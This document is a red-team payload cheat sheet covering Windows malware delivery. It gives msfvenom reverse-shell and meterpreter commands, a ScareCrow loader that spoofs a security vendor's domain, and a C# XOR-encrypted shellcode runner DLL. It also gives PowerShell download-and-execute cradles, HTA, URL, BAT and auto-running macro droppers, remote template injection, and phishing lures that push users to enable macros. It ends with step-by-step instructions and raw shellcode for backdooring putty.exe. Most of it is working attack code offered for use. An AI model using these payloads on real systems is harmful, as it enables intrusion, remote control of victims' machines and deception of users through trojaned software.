# Payloads Generation
## Portable Executable files
- Open with PEbear https://github.com/hasherezade/pe-bear
- Interesting sections: `text`(`.txt)`, `data`(`.data`), `resources`(`.rsrc`)

#### EXE vs DLL
- Exe are seperate programs which spawn an independant process
- DLL are modules that are loaded in existing processes

#### Example commandline exe
- [Link](cplusplus/Basics/implantDLL/implantDLL.cpp)

##### Build & Run
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

implant.exe
```

#### Example dll
- [Link](cplusplus/Basics/implantPE/implant.cpp)

##### Build & Run
```
cl.exe /D_USRDLL /D_WINDLL implantDLL.cpp /MT /link /DLL /OUT:implant.dll

rundll32 implant.dll,RunME
```

## Payload generation
- A lot of C2 frameworks such as Cobalt Strike, Metasploit etc can create their own payloads.

### Msfvenom
- Change the `-f` parameter to change the payload type. For example  `c` or `csharp`.
- Use `-e` to select an encoder and `-i` to change the iterations
- Use `EXITFUNC=thread` to get a clean exit and keep the process running [link](https://www.hacking-tutorial.com/tips-and-trick/what-is-metasploit-exitfunc/).

#### List payload & outputs & encoders
```
msfvenom --list payloads
msfvenom --list payloads | grep windows | grep x64

msfvenom --list formats

msfvenom --list encoders
```

#### Generate calc.exe
```
msfvenom -p windows/exec CMD='calc.exe' -f hex
msfvenom -p windows/x64/exec CMD='calc.exe' -f hex
```

#### Generate Messagebox payload
```
msfvenom -p windows/x64/messagebox TEXT="0xjs" -o msgbox64.bin
```

#### Generate Stageless Reverse Shell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 11 -o shell.bin
```

## Phishing
- https://github.com/ZeroPointSecurity/PhishingTemplates
- Any file downloaded via a browser (outside of a trusted zone) will be tainted with the "Mark of the Web" (MOTW).
- Files with MOTW are handled with additional security scrutiny - you may be familiar with both Windows SmartScreen and Office Protected View.
- If MS Office "block macros downloaded from the Internet" is enabled, a user cannot run a macro-enabled document even if they wanted to.
- Files that are emailed "internally" via a compromised Exchange mailbox are not tagged with a Zone Identifier.

#### Check MOTW data stream
- The possible zones are:
  - 0 Local computer
  - 1 Local intranet
  - 2 Trusted sites
  - 3 Internet
  - 4 Restricted sites
```
gc <FILE> -Stream Zone.Identifier
```

#### Web categorisation
- Domain names are categorised by vendors so that they be used for filtering purposes with for example web proxy's or firewalls.
- Two strategies for tackling this issue include:
  - Obtaining a domain that is already in a desirable category.
  - Requesting a change of category for a domain.
- Tools that may help:
  - https://sitereview.bluecoat.com/#/ 
  - https://github.com/mdsecactivebreach/Chameleon

## Scarecrow dll
- https://github.com/optiv/ScareCrow

#### Generate shellcode
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -i 11 -f raw -o shellcode.bin
```

#### Run with scarecrow
```
ScareCrow -Loader dll -domain trendmicro.com -I shellcode.bin
```

#### Start listener
```
sudo msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j -z'
```

#### Run payload
```
regsvr32.exe C:\Windows\Tasks\urlmon.dll
```

## Extra Xorred meterpreter DLL
- https://crypt0jan.medium.com/red-team-tutorials-4-616c565ccec9

#### Generate payload
- Save the payload size (byts). You need it later
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 --encoder x64/xor_dynamic -i 11 -f csharp > shellcode.txt
```

#### Xor payload
- https://github.com/crypt0jan/XORencoder
- ```git clone https://github.com/crypt0jan/XORencoder```
- Open the project in Visual Studio.
- Edit file ```Project.cs```, replacing the buf with your payload from Step 1
- At the top change Debug to Release and click Build XOR_encoder.
- Open the project directory ```\XORencoder\bin\Release\netcoreapp3.1\``` and run ```.\XOR_encoder.exe```
- Copy the new shellcode

#### Creating C# DLL
- Git clone https://github.com/crypt0jan/ClassLibrary1
- Paste the code from below over the code in ```Class1.cs```, to change some names.
- Edit line 39 and add the amount of bytes ```byte[] buf = new byte[1072]```
- Add the xorred shellcode.
- At the top change Debug to Release and click "Start"
- You will get an error popup but the build should succeed!

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace RunMe
{
    public class RunMeClass
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public static void RunBaby()
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            byte[] buf = new byte[1072]
                {  };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}

```

#### Create a download and execute cradle
- Download the ```ClassLibrary1.dll``` file to your webserver.
- Create a ```runme.ps1``` file with the following content:
```
$data = (New-Object System.Net.WebClient).DownloadData('http://<IP>/ClassLibrary1.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("RunMe.RunMeClass")
$method = $class.GetMethod("RunBaby")
$method.Invoke(0, $null)
```

#### Start listener
```
sudo msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j -z'
```

#### Download and execute cradle PowerShell:
```
powershell.exe -nop -w hidden -C "IEX (New-Object System.Net.WebClient).downloadString('http://<IP>/runme.ps1')"
```

## HTA files
```
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://<IP>/amsi.txt'))""; ""IEX ((new-object net.webclient).downloadstring('http://<IP>/HTTPStager.ps1'))"""
    End Function

    Pwn
  </script>
</html>
```

## URL file
```
C:\Windows\System32\cmd.exe /c powershell IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/amsi.txt')); IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/Invoke-PowerShellTcp2.ps1'))
```

## Bat file
```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/amsi.txt')); IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/Invoke-PowerShellTcp2.ps1'))"

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/amsi.txt')); IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/Invoke-PowerShellTcp2.ps1'))"
```

## bat2exe
- https://github.com/islamadel/bat2exe/releases/tag/2.0


## Macro's
- To prepare the document for delivery, go to File > Info > Inspect Document > Inspect Document, which will bring up the Document Inspector. Click Inspect and then Remove All next to Document Properties and Personal Information.  This is to prevent the username on your system being embedded in the document.
- Entice user to enable Macro's. Message example: "Security Product XYZ has scanned the content and deemed it to be safe.  To reveal the content, click Enable Content"

#### Simple macro
- Save it as `.doc`. Macro in a `.docx` is not possible and the `.docm` has a huge! and might get blocked by email gateways.
```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://<IP>/shell.ps1'))"""

End Sub
```

### Template injection
- Remote Template Injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious template.  This template may hold a macro, leading to code execution.

#### Manual way
1. Create a word document with prefered macro. Save it as `.dot` Word 97-2003 Template (*.dot) file.`
2. Host the template on a webserver for example `http://<IP>/template.dot`
3. Create a new document with the template and save it as `.docx`.
4. Browse to the directory in Windows explorer, right-click and select 7-Zip > Open archive. Navigate to word > _rels, right-click on settings.xml.rels and select Edit.
5. Change the target entry from the one pointing to the local file to the hosted template on the webserver. `Target="http://<IP>/template.dot"`

#### Automated
- https://github.com/JohnWoodman/remoteinjector

```
python3 remoteinjector.py -w http://<IP>/template.dot document.docx
```

## HTML Smuggling
- https://outflank.nl/blog/2018/08/14/html-smuggling-explained/

#### Backdooring Putty.exe
1. Download putty.exe https://www.putty.org/
2. Start [x32dbg](https://x64dbg.com/) and click `F3`, open Putty. Go to Breakpoints and click the first one.
3. Scroll down till you see a lot of nullbytes and copy and note down the first adress, optional: set a new breakpoint
	- Example: code cave address: `0045C961`
4. Go back to the first Breakpoint and copy the first lines of instructions
```
00454AD0 | 6A 60                    | push 60                                 |
00454AD2 | 68 B07A4700              | push putty.477AB0                       |
00454AD7 | E8 08210000              | call putty.456BE4                       |
00454ADC | BF 94000000              | mov edi,94                              | edi:"LdrpInitializeProcess"
00454AE1 | 8BC7                     | mov eax,edi                             | edi:"LdrpInitializeProcess"
```
5. Select the first first instruction and press `space`. (or right click and select assemble)
6. Change the instruction to `jump 0x` and then past the cave address. Example: `jmp 0x0045C961`
7. Placing shellcode in the nullbyte area will change the stack and pointers etc. Save all the value of the registers and flags to the stack. Set the following instructions in the first nullbytes:
```
pushad
pushfd
```
8. Select the rest of the nullbyte area and copy the following calc32 hex shellcode, right click the nullbyte area and go to Binary --> Edit. Paste it with the curson at the first `00`
```
fc e8 82 00 00 00 60 89 e5 31 c0 64
8b 50 30 8b 52 0c 8b 52 14 8b 72 28
0f b7 4a 26 31 ff ac 3c 61 7c 02 2c
20 c1 cf 0d 01 c7 e2 f2 52 57 8b 52
10 8b 4a 3c 8b 4c 11 78 e3 48 01 d1
51 8b 59 20 01 d3 8b 49 18 e3 3a 49
8b 34 8b 01 d6 31 ff ac c1 cf 0d 01
c7 38 e0 75 f6 03 7d f8 3b 7d 24 75
e4 58 8b 58 24 01 d3 66 8b 0c 4b 8b
58 1c 01 d3 8b 04 8b 01 d0 89 44 24
24 5b 5b 61 59 5a 51 ff e0 5f 5f 5a
8b 12 eb 8d 5d 6a 01 8d 85 b2 00 00
00 50 68 31 8b 6f 87 ff d5 bb f0 b5
a2 56 68 a6 95 bd 9d ff d5 3c 06 7c
0a 80 fb e0 75 05 bb 47 13 72 6f 6a
00 53 ff d5 63 61 6c 63 2e 65 78 65
00
```
9. Save the changes with `ctrl p`, click "Select All" and "Patch File". Save it as as a different file and run it. Calc.exe will execute!
10. But putty.exe won't run and the process will stop, even though calc.exe spawns. Set a breakpoint at every call by pressing `F2` on every line with `call`.
11. Run though the code till calc.exe spawns and add a comment to the last `call` which spawned calc.exe. Then continue till it exits and change the last call that exited.
12. Select a adress in the nullbyte area. For example `0045CA27`. Change the push before the last call by pressing `space` to `jmp 0x0045CA27`
13. Restore the state of the registers and flags. Set the following instructions at the adress of `0045CA27` and below
```
popfd
popad
```
14. Restore the first two instructions of step 5. Copy the bytes below and select the next empty nullbyte area, click "Binary" -> "Edit" and paste it.
```
6A 60 68 B0 7A 47 00
```
15. Make a jump to the next instruction from step 5. Copy the address (`00454AD7`) and change the next nullybyte to `jmp 0x00454AD7`
